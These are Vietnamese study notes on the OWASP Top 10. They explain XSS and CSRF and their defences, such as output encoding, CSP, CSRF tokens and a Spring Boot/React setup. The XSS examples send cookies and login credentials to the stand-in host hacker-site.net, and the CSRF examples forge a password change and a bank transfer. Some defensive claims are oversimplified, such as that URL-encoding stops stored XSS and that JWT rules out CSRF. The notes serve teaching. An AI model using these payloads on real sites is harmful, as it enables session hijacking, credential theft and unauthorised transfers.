# TOP 10 WEB APPLICATION SECURITY RISKS
Hàng năm, OWASP (the Open Web Application Security Project) công bố 10 lỗ hổng bảo mật hàng đầu

## 1. Injection

## 2. Broken Authentication

## 3. Sensitive Data Exposure

## 4. XML External Entities (XXE)

## 5. Broken Access Control

## 6. Security Misconfiguration

## 7. Cross-site Scripting (XSS)
- XSS là một trong những tấn công phổ biến và dễ bị tấn công nhất
- Là 1 client-side attacks
- Hacker sẽ chèn malicious script (script độc hại) để thực thi chúng ở browser (phía client) (Hacker có thể gửi cho user URL chứa mã độc hoặc user vô tình truy cập vào)
- Cách test 1 trang web có bị lỗ hổng XSS ko: nếu có thể chèn và run Javascript (Hiển thị alert('XXX') chẳng hạn) thông qua param truyền vào, thì trang đó dính lỗi XSS
- Thiệt hại:
  + Account hijacking/session hijacking: user bị chiếm phiên làm việc (hacker lấy được cookie sessionID là có thể mạo danh user được)
  + Đánh cắp credential: hacker có thể clone trang login và dùng XSS để lấy được username/password của user, chẳng hạn hacker send URL sau cho user login: www.phimmoi.net/login?redirect_to=<script>www.hacker-site.net?user=document.getElementById(username')&pass=document.getElementById('password')</script>
- Có 3 loại XSS

### 7.1. Reflected XSS
- Xảy ra khi *malicious script* **không được lưu trên web server** nhưng được phản ánh (reflected) trong kết quả của trang web
- Với cách tấn công này, hacker chèn mã độc (JS code) vào URL dưới dạng query string
- VD1: Hacker gửi cho user 1 URL như sau: https://phimmoi.net/search?q=<script>deleteAccount();</script>. Khi user click vô link đó, account của họ trên trang phimmoi sẽ bị xóa
- VD2: Hacker gửi cho user 1 URL như sau: https://phimmoi.net/name=var+i=new+Image;+i.src="http://hacker-site.net/"%2Bdocument.cookie;
  + Đoạn Javascript mà hacker tạo ra thực tế như sau:
  ```
  var i=new Image; i.src="http://hacker-site.net/"+document.cookie;
  ```
  + Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng: session của người dùng sẽ bị chiếm
- Có thể kiểm tra 1 web có dính lỗ hổng này ko bằng cách thử nhập ```<script>alert('Hacked!!!')</script>``` vào 1 ô input (ô tìm kiếm chẳng hạn), rồi click OK. Nếu browser alert 'Hacked!!!' thì web này bị dính rồi!

### 7.2. Persistent XSS (Stored XSS)
- Xảy ra khi *malicious script* đang được **lưu trên web server**. Tấn công theo cách này có thể được coi là rủi ro hơn và nó cung cấp nhiều thiệt hại hơn
- VD: trên forum voz.net, 1 user vào bình luận ở 1 thread với nội dung sau: ```<script>alert(document.cookie)</script>```. Server lưu lại bình luận đó trong database, sau đó bất kỳ user khác khi vào thread đó sẽ gặp bình luận trên và thực thi script đọc toàn bộ cookie của họ. Nếu server mã hóa kí tự trước khi lưu vào database (chẳng hạn "/" => "%2F") thì sẽ ko bị lỗi này!

### 7.3. DOM
– This occurs, when the DOM environment is being changed, but the code remains the same.
- VD: https://phimmoi.net?page=1. Sửa param page thành: https://phimmoi.net?page=<script>alert(document.cookie)</script>

### Phòng tránh
- Encoding: chuyển các kí tự < > thành &lt; %gt;.
- Validation/Sanitize: loại bỏ hoàn toàn các kí tự khả nghi trong input của người dùng, hoặc thông báo lỗi nếu trong input có các kí tự này. **"Đừng bao giờ tin tưởng input của người dùng"**
- CSP (Content Security Policy): Với CSP, trình duyệt chỉ chạy Javascript từ những domain được chỉ định. Để sử dụng CSP, server chỉ cần thêm header Content-Security-Policy vào mỗi response. Nội dung header chứa những  domain mà ta tin tưởng:
```
Content-Security-Policy: script-src 'self' https://apis..google.com
```

### Ref
- https://toidicodedao.com/2016/10/18/lo-hong-bao-mat-xss/
- https://viblo.asia/p/ky-thuat-tan-cong-xss-va-cach-ngan-chan-YWOZr0Py5Q0
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

## 8. Insecure Deserialization

## 9. Using Components with Known Vulnerabilities

## 10. Insufficient Logging & Monitoring

## CSRF (Cross Site Request Forgery - Giả mạo request liên trang, còn có tên khác là XSRF)
Hacker khiến user thực hiện 1 ành động mà họ ko hề biết và ko có ý muốn thực hiện (chẳng hạn chuyển khoản 1000$ từ account của user sang account của hacker)

### Example 1
- Trang https://phimmoi.net/account/change-password là trang dùng để đổi password, có nội dung form như sau
```html
<form method='post' action='account/save-pw'>
  <input type='password' name='password' />
  <input type='password' name='password_confirm' />
  <input type='submit' value='Save' />
</form>
```
- Hacker tạo 1 trang giả mạo domain là https://hacker-blog.com/download-pts:
```html
<img src='download-pts-free' />
<form method='post' action='https://phimmoi.net/account/save-pw'>
  <input type='password' name='password' value='123456' hidden />
  <input type='password' name='password_confirm' value='123456' hidden />
  <input type='submit' value='Click here to download Photoshop for free' />
</form>
```
- User vào trang hacker-blog trên, click vào link "Click here to download Photoshop for free", thì trang này lập tức tạo 1 request tới trang phimmoi.net yêu cầu đổi password của chính user đó! Done, giờ password của user này đã bị đổi thành 123456

### Example 2
- Tiếp diễn ví dụ trên, user vừa mở 1 tab vào Vietcombank, vừa mở 1 tab vào trang https://hacker-blog.com/download-pts. Giả sử user đã login vào hệ thống ngân hàng của Vietcombank, username của người đó trên Vietcombank là tuzaku, và username của hacker trên Vietcombank là liliana.
- Cũng trên trang hacker-blog đó, hacker tạo 1 thẻ img với nội dung như sau:
```<img src='https://vietcombank.net/transfer-money?from=tuzaku&to=liliana&amount=1000' />```
- Và cũng giả sử rằng trang vietcombank.net trên do bảo mật yếu, đội dev khá nghiệp dư nên họ thiết kế để có thể chuyển tiền bằng method=GET. Ngay khi user truy cập trang hacker-blog đó, 1 request chuyển tiền 1000$ từ tài khoản của user sang tài khoản của hacker đã thực hiện

### Phòng chống
- Sử dụng CSRF Token: Trong mỗi form hay request, ta đính kèm một CSRF token. Token này được tạo ra dựa theo session của user. Khi gửi về server, ta kiểm tra độ xác thực của session này. Do token này được tạo ngẫu nhiên dựa theo session nên hacker không thể làm giả được (Các framework như RoR, CodeIgniter, ASP.NET MVC đều hỗ trợ CSRF token):
```html
<form method='post' action='account/save-pw'>
  <input type='password' name='password' />
  <input type='password' name='password_confirm' />
  <input type='text' hidden name='csrf_token' value='random-string-generated-by-server' />
  <input type='submit' value='Save' />
</form>
```

### Note: No cookies = No CSRF
Trong 2 ví dụ trên, trang phimmoi và trang vietcombank bắt buộc user phải login mới có thể đổi pass hay là chuyển tiền. Và sau khi user login xong, rồi vào trang của hacker mới click vào URL nhiễm mã độc đó. Bởi vì nếu user chưa login thì có click vào cũng chả sao, vì phía server sẽ từ chối request đó do chưa được xác thực.

Giả sử server phía backend xác thực bằng cookie (chứ ko dùng JWT), tức là server dùng session để lưu trạng thái user. Flow của việc authen bằng session như sau:
- User login thành công, server tạo 1 sessionID lưu thông tin user, sau đó set cookie cho browser của user có dạng: sessionID=abc. Cookie này có flag httpOnly = true nên ko thể đọc được từ ```document.cookie```
- Mỗi request tới server, browser tự động gửi kèm sessionID lên server (do cơ chế của browser là tự động gửi mọi cookie theo), server dùng sessionID để xác thực đó là user nào

Sau khi user vào trang của hacker và click vào đường link độc, 1 request sẽ gửi về phimmoi/vietcombank kèm theo sessionID mà user đã login trước đó, thế nên hacker mới có thể hại được user! (Mặc dù hacker **KHÔNG trộm được sessionID**, do cookie này thường có flag ```httpOnly=true```)

Nếu như server ko authenticate user dùng cookie (thay vào đó có thể dùng JWT chẳng hạn) thì sẽ chẳng có tấn công CSRF!

### Config CSRF with Spring Boot and ReactJS app
- Config Spring security dùng ```CookieCsrfTokenRepository```, nó sẽ gửi tới browser 1 cookie tên là ```XSRF-TOKEN```
- Phía ReactJS (Frontend) dùng cookie đó và **gửi ngược lại** phía Backend ở header, với tên header là ```X-XSRF-TOKEN```. Note: việc gửi kèm header này chỉ cần với các API thay đổi data (Method = PUT/POST/PATCH/DELETE), còn việc get data thì ko cần thiết

Phía Backend config như sau:
```java
@Override
protected void configure(HttpSecurity http) throws Exception {
  http
    .csrf()
      .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
      .and()
    .authorizeRequests()
      .antMatchers("/", "/api/user").permitAll()
      .anyRequest().authenticated();
}
```
```withHttpOnlyFalse()``` để set flag ```httpOnly=false```, thì phía browser mới đọc được cookie XSRF-TOKEN này thông qua ```document.cookie```

Phía Frontend config như sau: Nếu dùng Axios thì chả cần config gì đâu, bở vì Axios **tự động check** xem có tồn tại cookie ```XSRF-TOKEN``` hay ko, nếu có thì nó **tự động gửi** kèm 1 header tên là ```X-XSRF-TOKEN``` với mỗi request tới server. Hình như framework Laravel cũng có tự động gửi header như vậy đó: https://inertiajs.com/csrf-protection
# Ref
- https://owasp.org/www-project-top-ten/
- https://www.hacksplaining.com/owasp
